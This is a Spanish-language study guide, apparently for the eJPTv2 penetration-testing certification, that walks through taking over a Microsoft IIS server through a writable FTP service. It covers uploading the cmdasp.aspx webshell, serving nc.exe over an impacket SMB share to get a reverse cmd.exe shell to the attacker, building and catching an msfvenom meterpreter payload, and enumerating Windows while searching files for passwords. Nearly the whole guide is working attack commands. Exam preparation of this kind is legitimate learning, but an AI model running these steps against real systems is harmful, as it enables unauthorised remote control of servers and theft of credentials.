---
layout: default
title: Preparación EJPTv2
---

## Microsoft IIS

### 📝 ¡IMPORTANTE!:

 💡 - Si al entrar en el servicio FTP comprobamos que este servicio está vinculado con la web que esté corriendo por el puerto 80 y en el puerto 80 vemos que está corriendo un servicio como Microsoft IIS o parecido, debemos realizar los siguientes pasos:

## 🏴‍☠️ ¿Obtener acceso remoto?

- En nuestra máquina atacante buscamos: find / -name cmdasp.aspx 2>/dev/null que normalmente Kali Linux lo almacena en el siguiente directorio: /usr/share/webshells/aspx/cmdasp.aspx

Una vez tengamos este recurso localizado deberemos COPIAR el mismo a nuestro directorio actual, y digo copiar porque si este recurso lo movemos y después lo eliminamos nos quedaremos sin el. Ahora desde nuestro directorio actual donde nos hemos traído el archivo debemos conectarnos nuevamente al servicio FTP por el puerto 21 y ahora con el comando put subir el archivo.

```bash
put cmdasp.aspx # Subir el archivo que nos habiamos copiado a nuestro directorio.
```

Una vez tengamos el archivo copiado en el servidor FTP víctima lo que debemos hacer el irnos al navegador, apuntar al host objetivo pero añadiendo /cmdasp.aspx

```bash
<host_objetivo>/cmdasp.aspx # Apuntar al host objetivo.
```

Y veremos que se no mostrará un campo en el que podremos introducir comandos para ejecutarlos y desde ese momento habremos conseguido un RCE.

## 🔓 ¿Cómo consigo intrusión a nuestra máquina víctima?

Al igual que hemos hecho antes ahora debemos buscar el archivo nc.exe que suele estar en este directorio: /usr/share/windows-resources/binaries/nc.exe debemos realizar la misma operación que antes y copiar este archivo en nuestra máquina atacante a nuestro directorio de trabajo actual.

```bash
find / -name nc.exe 2>/dev/null # Buscamos este archivo en nuestra máquina atacante y lo copiamos a nuestro directorio de trabajo actual.
```

Una vez que tenemos este archivo localizado y copiado en nuestro directorio actual lo que vamos a hacer es en este mismo directorio levantar un servidor con un recurso compartido para posteriormente desde el host donde tenemos el RCE apuntar a dicho recurso compartido y ejecutarlo para así conseguir una Reverse Shell.

Levantamos un recurso compartido con la herramienta impacket

```bash
impacket-smbserver <nombre_recurso> $(pwd) -smb2support # Con $(pwd) le indicamos que levante el servidor en el directório actual.
```

Una vez que hayamos iniciado el servidor con nuestro recurso compartido, en nuestra máquina atacando vamos a abrir otra pestaña nueva y vamos a ponernos a la escucha con Netcat por el puerto que nosotros queramos para recibir la conexión y entablar la reverse shell.

```bash
sudo nc -nlvp <puerto_escogido> # Escogemos el puerto que queramos Ej: 443,4444,5555, etc.
```

Volvemos a la web donde con cmdasp habíamos conseguido la ejecución remota de comandos, y en la barra donde introduciamos el comando a ejecutar, escribimos lo siguiente:

```bash
\\<ip_nuestra_máquina>\<recurso_compartido>\\nc.exe -e cmd.exe <ip_nuestra_máquina> <puerto_escucha_netcat> # Ejemplo: \\10.10.10.10\exerecurso\nc.exe -e cmd.exe 10.10.10.10 443
```

Si accedemos a la pestaña donde establecimos la escucha con Netcat, podremos verificar que hemos obtenido una reverse shell. A continuación, es fundamental determinar si la intrusión se ha realizado con privilegios de administrador, el usuario con los máximos permisos en el sistema. En caso contrario, será necesario llevar a cabo pasos adicionales para elevar privilegios.

Para ello, convertiremos la sesión obtenida con Netcat en una sesión de Meterpreter, lo que nos permitirá utilizar Metasploit para la escalada de privilegios. El primer paso en este proceso es generar un archivo ejecutable (.exe) que deberá ejecutarse en la máquina víctima con el fin de establecer la sesión de Meterpreter

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<nuestra_ip> LPORT=<puerto_escucha> -f exe > shell.exe # Creamos un archivo .exe malicioso para obtener una sesión meterpreter.
```

¿Cómo llevo este archivo a la máquina víctima?

Pues para realizar este proceso debemos hacer exactamente el mismo procedimiento de antes, levantarnos un servidor con un recurso compartido.

```bash
impacket-smbserver <nombre_recurso> $(pwd) -smb2support # Con $(pwd) le indicamos que levante el servidor en el directório actual.
```


Ahora para poder realizar la descarga del recurso compartido lo que debemos hacer es irnos a un directorio dentro de la máquina víctima que nos permita esa descarga de archivos, que en este caso será el directorio /temp

```bash
copy \\<ip_nuestra_máquina>\\<nombre_recurso>\\shell.exe shell.exe # Accedemos a la carpeta Temp y nos traemos la shell.exe.
```

Antes de ejecutar el archivo .exe nos tenemos que poner a la escucha con metasploit:

```bash
    msfconsole -q # Iniciar metasploit en modo silencioso.
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST <ip_nuestra_máquina>
    set LPORT <puerto_escogido>
    run
```

Una vez que el payload se haya cargado, debemos acceder a la máquina víctima y ejecutar shell.exe para activar el archivo malicioso y establecer la sesión de Meterpreter.

Ahora que la sesión de Meterpreter está activa, el siguiente paso es determinar las acciones a realizar. Podemos explorar el sistema comprometido, escalar privilegios, mantener el acceso o extraer información relevante, según los objetivos del procedimiento.

Ahora os mostraré una serie de comandos que os serán útiles cuando hayamos ganado esa intrusión como el usuario con máximos privilegios.


## 📝 Comandos de interés

```bash
meterpreter > getuid # Verificamos si hemos conseguido privilegios máximos
sessions -l # Ver sesiones activas en metasploit.
sessions -v # Mostrar información detallada de las sesiones.
sessions -L # Listar sesiones y sus rutas.
sessions -k <número_sesión> # Eliminar una sesión específica.
sessions -K # Para eliminar todas las sesiones activas. 
```

## 🔍 Enumeración del Sistema

```bash
systeminfo # Información básica del sistema
hostname # Información básica del sistema
ver # Versión del sistema operativo
winver # Versión del sistema operativo
```

## 🔍Información de Usuario y Privilegios

```bash
whoami /all # Usuario actual y privilegios
net user # Usuario actual y privilegios
net localgroup administrators # Usuario actual y privilegios
whoami /priv # Usuario actual y privilegios
qwinsta # Listado de usuarios conectados
query user # Listado de usuarios conectados
```

## 🔍Enumeración de Red

```bash
ipconfig /all # Configuración de red
route print # Configuración de red
netstat -ano # Configuración de red
arp -a # Configuración de red
net share # Recursos compartidos
net use # Recursos compartidos
```

## 🔍 Búsqueda de Archivos Sensibles

```bash
C:\Users[username]\AppData\

C:\Windows\System32\config\

C:\Program Files\

C:\Windows\Panther\

C:\Windows\repair\
```

```bash
# Búsqueda de archivos sensibles
dir /s /b "C:\\*.txt" "C:\\*.pdf" "C:\\*.doc" "C:\\*.docx"
findstr /si password *.txt *.xml *.ini
dir /s /b /a "C:\\Users\\*pass*.txt" "C:\\Users\\*pass*.xml" "C:\\Users\\*pass*.ini"
```

--- 
